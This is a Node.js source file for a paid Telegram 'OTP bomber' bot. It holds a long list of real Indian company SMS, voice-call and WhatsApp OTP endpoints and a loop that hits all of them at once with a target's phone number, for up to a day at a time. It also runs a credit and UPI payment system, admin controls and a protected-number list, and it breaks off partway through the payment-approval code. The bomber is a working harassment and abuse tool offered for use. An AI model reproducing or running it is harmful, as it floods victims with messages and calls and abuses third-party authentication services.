// bot.js – Complete OTP Bomber with ALL APIs (SUPER FAST)
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const http = require('http');
const https = require('https');
const { BOT_TOKEN, ADMIN_IDS } = require('./config');
const db = require('./database');
const fs = require('fs');
const path = require('path');

// ===== HTTP AGENTS FOR FASTER CONNECTIONS =====
const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 200, maxFreeSockets: 50, timeout: 3000 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 200, maxFreeSockets: 50, timeout: 3000 });

// ===== MEMORY MANAGEMENT =====
const MEMORY_LIMIT = 500;
let lastGCTime = Date.now();

function checkMemory() {
    const now = Date.now();
    if (now - lastGCTime < 30000) return;
    lastGCTime = now;
    const used = process.memoryUsage().heapUsed / 1024 / 1024;
    if (used > MEMORY_LIMIT) {
        console.log(`⚠️ Memory high (${used.toFixed(1)}MB), running GC...`);
        if (global.gc) global.gc();
    }
}

// ===== ERROR HANDLING =====
process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (reason) => {
    console.error('❌ Unhandled Rejection:', reason);
});

const bot = new TelegramBot(BOT_TOKEN, { polling: { interval: 100, autoStart: true, params: { timeout: 10 } } });

// ===== STATUS MAPS =====
const bombingStatus = new Map();
const userStates = new Map();
const pendingPayments = new Map();
const pendingScreenshots = new Map();
const adminBroadcastState = new Map();

// ===== SUPER AGGRESSIVE OPTIMIZATION =====
const BATCH_SIZE = 100;
const BATCH_DELAY = 0;
const API_TIMEOUT = 1200;
const MAX_RETRIES = 0;
const CYCLE_DELAY = 0;

// ===== QR CODE PATH =====
let qrCodePath = path.join(__dirname, 'qr_code.jpg');
let qrCodeSet = false;

// ============================================================
// ===== ALL API CONFIGURATIONS =====
// ============================================================

const SMS_APIS = [
    { name: "Swiggy", method: "POST", url: "https://www.swiggy.com/mapi/auth/signup", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0", "origin": "https://www.swiggy.com" }, data: (p) => JSON.stringify({ mobile: p, name: "User", email: `user${p}@gmail.com`, password: "Test@123456" }) },
    { name: "Zomato", method: "POST", url: "https://www.zomato.com/webroutes/auth/login", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0", "x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d" }, data: (p) => JSON.stringify({ phone: p, country_id: 1, method: "phone" }) },
    { name: "UrbanCompany", method: "POST", url: "https://www.urbanclap.com/api/v2/growth/profile/generateOTP", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: { isd_code: "+91", phone_wo_isd: p }, country_id: "IND" }) },
    { name: "Ola", method: "POST", url: "https://accounts.olacabs.com/api/login", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobileNumber: p, dialingCode: "+91", countryCode: "IN" }) },
    { name: "BigBasket", method: "POST", url: "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ identifier: p }) },
    { name: "Netmeds", method: "POST", url: "https://m.netmeds.com/mst/rest/v1/id/details", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Dunzo", method: "POST", url: "https://apis.dunzo.in/api/v1/send_otp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone_number: "+91" + p }) },
    { name: "Rapido", method: "POST", url: "https://customer.rapido.bike/api/otp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "BookMyShow", method: "POST", url: "https://in.bookmyshow.com/pwa/api/uapi/otp/send", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ channel: "phone", subChannel: "sms", details: { phone: p } }) },
    { name: "MakeMyTrip", method: "POST", url: "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0", "authorization": "h4nhc9jcgpAGIjp" }, data: (p) => JSON.stringify({ loginId: p, type: "MOBILE", countryCode: "91" }) },
    { name: "Oyo", method: "POST", url: "https://www.oyorooms.com/api/pwa/generateotp", headers: { "content-type": "text/plain;charset=UTF-8", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: p, country_code: "+91", nod: 4 }) },
    { name: "Dominos", method: "POST", url: "https://api.dominos.co.in/loginhandler/forgotpassword", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Paytm", method: "POST", url: "https://accounts.paytm.com/v2/api/register", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Jio", method: "POST", url: "https://www.jio.com/api/v1/generate-otp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobileNumber: p }) },
    { name: "Airtel", method: "POST", url: "https://www.airtel.in/api/v1/otp/generate", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Gaana", method: "POST", url: "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: "91-" + p }) },
    { name: "Flipkart", method: "POST", url: "https://1.rome.api.flipkart.com/1/action/view", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ actionRequestContext: { loginId: p, loginIdPrefix: "+91", type: "LOGIN_IDENTITY_VERIFY" } }) },
    { name: "Snapdeal", method: "POST", url: "https://m.snapdeal.com/signupCompleteAjax", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `j_mobilenumber=${p}&agree=true&j_fullname=Test` },
    { name: "Lenskart", method: "POST", url: "https://api.lenskart.com/v2/customers/sendOtp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ telephone: p }) },
    { name: "Nykaa", method: "POST", url: "https://www.nykaa.com/app-api/index.php/customer/send_otp", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `mobile_number=${p}&source=sms` },
    { name: "Hotstar", method: "PUT", url: "https://api.hotstar.com/um/v3/users/register", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0", "x-country-code": "IN" }, data: (p) => JSON.stringify({ phone_number: p, country_prefix: "91" }) },
    { name: "AltBalaji", method: "POST", url: "https://api.cloud.altbalaji.com/accounts/mobile/verify", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone_number: p, country_code: "91" }) },
    { name: "Voot", method: "POST", url: "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ type: "mobile", mobile: p, countryCode: "+91" }) },
    { name: "SonyLIV", method: "POST", url: "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobileNumber: p, channelPartnerID: "MSMIND", country: "IN" }) },
    { name: "Zee5", method: "POST", url: "https://b2bapi.zee5.com/device/sendotp_v1.php", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `phoneno=${p}` },
    { name: "Dream11", method: "POST", url: "https://www.dream11.com/graphql/mutation/pwa/register", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ query: "mutation register($email: String!, $mobileNumber: String!, $password: String!) { registerSendOTPMutation(email: $email, mobileNumber: $mobileNumber, password: $password) { message }}", variables: { email: `user${p}@gmail.com`, mobileNumber: p, password: "Test@123456" } }) },
    { name: "MedPlus", method: "POST", url: "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `mobileNumber=${p}&firstName=Test&emailId=test${p}@gmail.com` },
    { name: "Apollo247", method: "POST", url: "https://webapi.apollo247.com/", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0", "Authorization": "Bearer 3d1833da7020e0602165529446587434" }, data: (p) => JSON.stringify({ operationName: "Login", variables: { mobileNumber: "+91" + p, loginType: "PATIENT" }, query: "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) { login(mobileNumber: $mobileNumber, loginType: $loginType) { status message } }" }) },
    { name: "PharmEasy", method: "POST", url: "https://pharmeasy.in/api/v2/auth/send-otp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "1mg", method: "POST", url: "https://www.1mg.com/auth_api/v6/create_token", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ number: p }) },
    { name: "NoBroker", method: "POST", url: "https://www.nobroker.in/api/v3/account/otp/send", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `phone=${p}&countryCode=IN` },
    { name: "Spinny", method: "POST", url: "https://api.spinny.com/api/c/user/otp-request/v3/", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ contact_number: p }) },
    { name: "RedBus", method: "POST", url: "https://m.redbus.in/api/getOtp", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `number=${p}&cc=91` },
    { name: "Unacademy", method: "POST", url: "https://unacademy.com/api/v3/user/user_check/", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: p, country_code: "IN", send_otp: true }) },
    { name: "Byjus", method: "POST", url: "https://bcas-prod.byjusweb.com/api/send-otp", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `phoneNumber=${p}` },
    { name: "Vedantu", method: "POST", url: "https://user.vedantu.com/user/preLoginVerification", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phoneNumber: p, phoneCode: "+91" }) },
    { name: "Doubtnut", method: "POST", url: "https://doubtnut.com/api/v1/user/login", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `phone=${p}` },
    { name: "Cuemath", method: "POST", url: "https://www.cuemath.com/api/v4/parents/", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: p, intl_mobile: { phone: p } }) },
    { name: "Aakash", method: "POST", url: "https://digital.aakash.ac.in/signup-otp-verify", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `mobileval=${p}` },
    { name: "Kotak811", method: "POST", url: "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `cust_mobile=${p}&cust_full_name=Test&cust_email=test${p}@gmail.com` },
    { name: "AngelBroking", method: "POST", url: "https://www.angelbroking.com/form-gateways/oda-form.php", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `mobile=${p}&name=Test` },
    { name: "ICICI", method: "POST", url: "https://www.icicibank.com/api/otp/generate", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "HDFC", method: "POST", url: "https://leads.hdfcbank.com/applications/webforms/apply/otp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "AxisBank", method: "POST", url: "https://www.axisbank.com/api/otp/send", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "BajajFinserv", method: "POST", url: "https://www.bajajfinserv.in/api/otp/generate", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobileNumber: p }) },
    { name: "FBBOnline", method: "POST", url: "https://www.fbbonline.in/customer/account/GenerateOtp", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `RegistrationForm%5Bcontact_number%5D=${p}&RegistrationForm%5Bemail%5D=test${p}@gmail.com` },
    { name: "Grofers", method: "POST", url: "https://grofers.com/v2/accounts/", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `user_phone=${p}` },
    { name: "GetInstaCash", method: "POST", url: "https://getinstacash.in/sell/getData.php", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `type=sendOTP&mobile=${p}` },
    { name: "Careers360", method: "POST", url: "https://www.careers360.com/ajax/no-cache/user/otp-send", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `mobile_number=${p}` },
    { name: "Coolwinks", method: "POST", url: "https://api.coolwinks.com/api/accounts/is_already_registered/", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ username: p }) },
    { name: "Cansell", method: "POST", url: "https://webapi.cansell.in/api/User/SignUp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: p, name: "Test", email: `test${p}@gmail.com`, password: "Test@123" }) },
    { name: "Ogonn", method: "POST", url: "https://ogonn.in/otp", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `mobile=${p}` },
    { name: "Limeroad", method: "POST", url: "https://www.limeroad.com/auth/get_uuid_v2", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `user_id=${p}` },
    { name: "Banggood", method: "POST", url: "https://m.banggood.in/index.php", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `com=login&t=sendMtSms&c=api&mobilePhone=${p}&countryPhoneCode=91` },
    { name: "Purplle", method: "POST", url: "https://www.purplle.com/api/account/authorization/send_otp", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `phone=${p}&action=register` },
    { name: "Dineout", method: "POST", url: "https://www.dineout.co.in/xhrajaxrequest/user_signup", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `phone=${p}&name=Test&email=test${p}@gmail.com` },
    { name: "PizzaHut", method: "POST", url: "https://api.pizzahut.io/v1/otp/generate", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: "+91" + p }) },
    { name: "KFC", method: "POST", url: "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phoneNumber: p }) },
    { name: "BurgerKing", method: "POST", url: "https://consumer-apis.burgerking.in/api/v1/user/signUp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone_no: p }) },
    { name: "EasyMyTrip", method: "POST", url: "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ emailph: p }) },
    { name: "HappyEasyGo", method: "GET", url: "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}", headers: { "user-agent": "Mozilla/5.0" }, data: null, phoneInUrl: true },
    { name: "Ullu", method: "POST", url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({}), phoneInUrl: true },
    { name: "Quikr", method: "POST", url: "https://www.quikr.com/core/sendOtp", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `user=${p}` },
    { name: "Cilory", method: "POST", url: "https://www.cilory.com/app/w/auth/soft", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "ASVM", method: "POST", url: "http://asvmfaizabad.org/register.php", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `mobile=${p}&name=Test&email=test@gmail.com&submit=Register` },
    { name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobileNo: p, countryCode: "+91", appCode: "un" }) },
    { name: "FloMattress", method: "POST", url: "https://cod.flomattress.com/api/otp", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `number=${p}` },
];

const VOICE_APIS = [
    { name: "TataCapital_Voice", method: "POST", url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: p, isOtpViaCallAtLogin: "true" }), type: "voice" },
    { name: "1mg_Voice", method: "POST", url: "https://www.1mg.com/auth_api/v6/create_token", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ number: p, otp_on_call: true }), type: "voice" },
    { name: "Swiggy_Voice", method: "POST", url: "https://profile.swiggy.com/api/v3/app/request_call_verification", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: p }), type: "voice" },
    { name: "Flipkart_Voice", method: "POST", url: "https://www.flipkart.com/api/6/user/voice-otp/generate", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ mobile: p }), type: "voice" },
    { name: "Paytm_Voice", method: "POST", url: "https://accounts.paytm.com/signin/voice-otp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: p }), type: "voice" },
    { name: "Ola_Voice", method: "POST", url: "https://api.olacabs.com/v1/voice-otp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: p }), type: "voice" },
    { name: "Uber_Voice", method: "POST", url: "https://auth.uber.com/v2/voice-otp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ phone: "+91" + p }), type: "voice" },
    { name: "Zomato_Voice", method: "POST", url: "https://www.zomato.com/php/o2_api_handler.php", headers: { "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0" }, data: (p) => `phone=${p}&type=voice`, type: "voice" },
];

const WHATSAPP_APIS = [
    { name: "KPN_WhatsApp", method: "POST", url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: p } }), type: "whatsapp" },
    { name: "Foxy_WhatsApp", method: "POST", url: "https://www.foxy.in/api/v2/users/send_otp", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ user: { phone_number: "+91" + p }, via: "whatsapp" }), type: "whatsapp" },
    { name: "Rappi_WhatsApp", method: "POST", url: "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" }, data: (p) => JSON.stringify({ country_code: "+91", phone: p }), type: "whatsapp" },
];

// Merge all APIs
const allApis = [...SMS_APIS, ...VOICE_APIS, ...WHATSAPP_APIS];
console.log(`✅ Loaded ${allApis.length} total APIs (SMS: ${SMS_APIS.length}, Voice: ${VOICE_APIS.length}, WhatsApp: ${WHATSAPP_APIS.length})`);

// ============================================================
// ===== SUPER FAST API CALL FUNCTION =====
// ============================================================

async function makeApiCall(api, phone) {
    try {
        let url = api.url;
        if (api.phoneInUrl) {
            url = url.replace(/{phone}/g, phone);
        }

        let data = null;
        if (typeof api.data === 'function') {
            data = api.data(phone);
        } else if (api.data) {
            data = api.data;
        }

        const config = {
            method: api.method,
            url: url,
            headers: { ...api.headers },
            timeout: API_TIMEOUT,
            httpAgent: httpAgent,
            httpsAgent: httpsAgent,
            validateStatus: () => true,
            maxRedirects: 0,
        };

        if (data && (api.method === 'POST' || api.method === 'PUT')) {
            config.data = data;
        }

        const response = await axios(config);
        return { success: response.status < 500, type: api.type || 'sms', name: api.name };
    } catch (err) {
        return { success: false, type: api.type || 'sms', name: api.name };
    }
}

async function processApiBatch(apiBatch, phone) {
    const results = await Promise.allSettled(
        apiBatch.map(api => makeApiCall(api, phone))
    );
    
    let success = 0;
    let smsCount = 0, callCount = 0, whatsappCount = 0;
    
    for (let i = 0; i < results.length; i++) {
        const result = results[i];
        if (result.status === 'fulfilled' && result.value && result.value.success) {
            success++;
            if (result.value.type === 'voice') callCount++;
            else if (result.value.type === 'whatsapp') whatsappCount++;
            else smsCount++;
        }
    }
    
    return { success, smsCount, callCount, whatsappCount };
}

async function runBomber(chatId, phone, durationMinutes) {
    const protectedList = await db.getProtected();
    if (protectedList.includes(phone)) {
        bot.sendMessage(chatId, '⚠️ This number is PROTECTED by admin.\nBombing not allowed!');
        bombingStatus.set(chatId, false);
        return;
    }

    if (bombingStatus.get(chatId)) {
        bot.sendMessage(chatId, '❌ Bombing already active. Use /stop first.');
        return;
    }
    bombingStatus.set(chatId, true);

    const user = await db.getUser(chatId);
    const isUnlimited = user.daily_unlimited > Date.now() / 1000;

    if (!isUnlimited) {
        const cost = getBombCost(durationMinutes);
        if (!ADMIN_IDS.includes(Number(chatId)) && user.credits < cost) {
            bot.sendMessage(chatId, `❌ Insufficient credits! Need ${cost} credits for ${getDurationText(durationMinutes)}.`);
            bombingStatus.set(chatId, false);
            return;
        }
        await db.updateCredits(chatId, -cost);
    }

    user.total_attacks += 1;
    await user.save();

    const sessionId = `${Date.now()}_${phone}`;
    user.bomb_sessions.push({
        session_id: sessionId,
        phone,
        start_time: Date.now() / 1000,
        duration: durationMinutes,
        is_unlimited: isUnlimited,
    });
    await user.save();

    const durationText = getDurationText(durationMinutes);
    const msg = await bot.sendMessage(
        chatId,
        `⚔️ **BOMBING STARTED**\n📱 Target: \`${phone}\`\n⏱️ Duration: ${durationText}\n🔁 Looping ALL ${allApis.length} APIs continuously...\n${isUnlimited ? '⭐ UNLIMITED PLAN ACTIVE' : `💳 Cost: ${getBombCost(durationMinutes)} credits`}`,
        { parse_mode: 'Markdown' }
    );

    let smsCount = 0, callCount = 0, whatsappCount = 0, totalSent = 0;
    let lastUpdate = Date.now();
    const updateInterval = 200;
    const startTime = Date.now() / 1000;
    const endTime = startTime + (durationMinutes === 1440 ? 86400 : durationMinutes * 60);
    const apiList = allApis;
    let cycleCount = 0;

    while (bombingStatus.get(chatId)) {
        if (!isUnlimited && Date.now() / 1000 >= endTime) break;
        checkMemory();

        // ALL APIs in ONE batch - NO splitting, NO delay
        const result = await processApiBatch(apiList, phone);
        
        totalSent += result.success;
        smsCount += result.smsCount;
        callCount += result.callCount;
        whatsappCount += result.whatsappCount;
        cycleCount++;

        const now = Date.now();
        if (now - lastUpdate >= updateInterval) {
            lastUpdate = now;
            const timeLeft = isUnlimited ? '∞' : Math.floor(endTime - now / 1000);
            const timeLeftText = typeof timeLeft === 'number' ? `${Math.floor(timeLeft/60)}m ${timeLeft%60}s` : '∞';
            try {
                await bot.editMessageText(
                    `⚔️ **BOMBING IN PROGRESS**\n📱 Target: \`${phone}\`\n⏱️ Time Left: ${timeLeftText}\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n🔄 Cycles: ${cycleCount}\n🚀 Speed: ~${cycleCount * allApis.length} attempts\n\n🔴 Use /stop to halt`,
                    { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' }
                );
            } catch (e) {}
        }
    }

    bombingStatus.set(chatId, false);
    const finalStatus = bombingStatus.get(chatId) === false ? 'STOPPED' : 'COMPLETED';
    await bot.editMessageText(
        `✅ **BOMBING ${finalStatus}**\n📱 Target: \`${phone}\`\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n🔄 Total Cycles: ${cycleCount}\n📊 Total Attempts: ${cycleCount * allApis.length}\n\n🟢 Use /bomb to start again`,
        { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' }
    );

    const updatedUser = await db.getUser(chatId);
    const session = updatedUser.bomb_sessions.find(s => s.session_id === sessionId);
    if (session) {
        session.end_time = Date.now() / 1000;
        session.total_sent = totalSent;
        session.sms_count = smsCount;
        session.call_count = callCount;
        session.whatsapp_count = whatsappCount;
        session.status = finalStatus;
        session.cycles = cycleCount;
        await updatedUser.save();
    }
}

function getBombCost(minutes) {
    if (minutes === 1440) return 100;
    if (minutes <= 0) return 0;
    if (minutes <= 10) return minutes;
    return 10;
}

function getDurationText(minutes) {
    if (minutes === 1440) return '1 Day (Unlimited)';
    if (minutes < 60) return `${minutes} Minute${minutes > 1 ? 's' : ''}`;
    const h = Math.floor(minutes / 60);
    const m = minutes % 60;
    if (m === 0) return `${h} Hour${h > 1 ? 's' : ''}`;
    return `${h} Hour${h > 1 ? 's' : ''} ${m} Minute${m > 1 ? 's' : ''}`;
}

// ============================================================
// ===== KEYBOARDS =====
// ============================================================

function mainKeyboard() {
    const day = new Date().getDate();
    const colors = ['🟢','🔵','🟡','🔴','🟣','🟠','🟤','⚫','⚪','🟢'];
    const color = colors[day % colors.length];
    return {
        reply_markup: {
            keyboard: [
                [`${color} START BOMB`, '🔴 STOP BOMB'],
                ['💰 MY CREDITS', '🎁 DAILY SPIN'],
                ['🎟️ REDEEM CODE', '👑 ADMIN PANEL'],
                ['📊 MY STATS', '❓ HELP'],
                ['💳 BUY CREDITS', '🔗 REFERRAL'],
                ['⚙️ SETTINGS']
            ],
            resize_keyboard: true
        }
    };
}

function adminKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📊 STATS', '👥 USERS LIST'],
                ['🎟️ GEN CODE', '🚫 BAN USER'],
                ['✅ UNBAN USER', '💰 ADD CREDITS'],
                ['➕ ADD PROTECTED', '➖ REMOVE PROTECTED'],
                ['📋 PROTECTED LIST', '📢 BROADCAST'],
                ['📋 ALL USERS', '🔄 UNLIMITED PLAN'],
                ['📺 CHANNEL MANAGER', '🛡️ SCANNER MANAGER'],
                ['📸 SET QR CODE', '💳 PAYMENT APPROVAL'],
                ['🔙 BACK']
            ],
            resize_keyboard: true
        }
    };
}

// ============================================================
// ===== CHANNEL BUTTONS =====
// ============================================================

async function getChannelButtons() {
    const channels = await db.getChannels();
    const buttons = channels.map(ch => {
        return [{ text: `✅ ${ch}`, url: `https://t.me/${ch.replace('@', '')}` }];
    });
    buttons.push([{ text: '🟢 I have joined all channels', callback_data: 'verify_join' }]);
    return { inline_keyboard: buttons };
}

// ============================================================
// ===== PAYMENT SYSTEM =====
// ============================================================

const PAYMENT_PLANS = {
    '10': { credits: 10, price: 20, label: '10 Credits – ₹20' },
    '25': { credits: 25, price: 40, label: '25 Credits – ₹40' },
    '50': { credits: 50, price: 70, label: '50 Credits – ₹70' },
    '100': { credits: 100, price: 120, label: '100 Credits – ₹120' },
    'unlimited': { credits: 0, price: 150, label: '⭐ 1 Day Unlimited – ₹150' }
};

async function handleBuyCredits(chatId, planKey) {
    const plan = PAYMENT_PLANS[planKey];
    if (!plan) return bot.sendMessage(chatId, '❌ Invalid plan!');

    if (!qrCodeSet) {
        return bot.sendMessage(chatId, '❌ Payment QR code not configured yet. Please contact admin.');
    }

    const caption = `💳 **${plan.label}**\n\n📌 **Instructions:**\n1️⃣ Scan the QR code below\n2️⃣ Pay ₹${plan.price} via UPI\n3️⃣ Take a screenshot of payment\n4️⃣ Send screenshot here\n\n📸 **After payment, send screenshot!**`;

    try {
        await bot.sendPhoto(chatId, qrCodePath, { caption: caption, parse_mode: 'Markdown' });

        const payId = Math.random().toString(36).substring(2, 10);
        pendingPayments.set(chatId, { ...plan, payId, status: 'pending', timestamp: Date.now() });
        userStates.set(chatId, { state: 'payment_screenshot', plan: planKey, payId });
    } catch (error) {
        bot.sendMessage(chatId, `❌ Failed to send QR code. Please try again.`);
    }
}

async function handlePaymentScreenshot(chatId, msg) {
    const state = userStates.get(chatId);
    if (!state || state.state !== 'payment_screenshot') return;

    if (!msg.photo) {
        return bot.sendMessage(chatId, '📸 Please send a **screenshot** of your payment.');
    }

    const planKey = state.plan;
    const plan = PAYMENT_PLANS[planKey];
    const payId = state.payId;

    const photo = msg.photo[msg.photo.length - 1];

    pendingScreenshots.set(payId, {
        userId: chatId,
        username: msg.from.username || 'No username',
        first_name: msg.from.first_name || 'No name',
        plan: planKey,
        credits: plan.credits,
        price: plan.price,
        fileId: photo.file_id,
        timestamp: Date.now(),
        status: 'pending'
    });

    const adminMsg = `📸 **New Payment Screenshot!**\n\n👤 User: ${msg.from.first_name} (@${msg.from.username || 'No username'})\n🆔 User ID: \`${chatId}\`\n💳 Plan: ${plan.label}\n💰 Amount: ₹${plan.price}\n🆔 Pay ID: \`${payId}\`\n\nApprove or Reject:`;

    const approvalKeyboard = {
        inline_keyboard: [
            [
                { text: '✅ Approve', callback_data: `approve_pay_${payId}` },
